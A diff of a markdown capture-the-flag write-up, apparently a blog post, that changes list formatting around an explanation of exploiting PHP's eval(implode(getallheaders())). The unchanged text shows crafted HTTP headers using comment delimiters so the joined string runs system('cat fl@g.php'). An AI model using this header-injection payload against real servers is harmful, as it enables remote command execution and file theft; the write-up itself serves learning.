@@ -238,7 +238,7 @@ eval(implode(getallheaders()))
 
 With those functions, first, we retrieve the HTTP Headers. The response from _getallheaders()_ came into a dictionary, so we can use the function _implode()_ to return a string from the dictionary. If we set a proper payload on the HTTP headers, we can then use it to evaluate it:
 
-HTTP headers:
+- HTTP headers:
 
 ```
 xyz: /*test
@@ -249,7 +249,7 @@ Others: ...
 abc: test*/
 ```
 
-getallheaders()
+- getallheaders()
 
 {% highlight json %}
 ["/*test", "138.91.58.10", 
@@ -257,7 +257,7 @@ getallheaders()
 "...", "test*/"]
 {% endhighlight %}
 
-implode()
+- implode()
 
 ```
 /*test138.91.58.10*/ eval(system('cat fl@g.php'));/*...test*/
